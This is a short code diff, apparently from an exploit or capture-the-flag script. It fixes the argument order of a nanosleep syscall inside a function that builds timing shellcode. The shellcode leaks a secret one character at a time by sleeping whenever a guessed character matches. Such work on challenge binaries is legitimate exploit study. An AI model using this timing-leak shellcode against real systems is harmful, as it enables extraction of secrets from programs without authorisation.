@@ -35,11 +35,11 @@ def create_timing_shellcode(position, character):
         jne skip
         
         /* If match, nanosleep for 0.1 seconds */
-        push 0
-        push 1000000000
-        mov rsi, rsp
-        xor rdi, rdi
-        mov rax, 35
+        push    0
+        push    1
+        mov     rdi, rsp
+        xor     rsi, rsi
+        mov     rax, 35
         syscall
         add rsp, 16
         
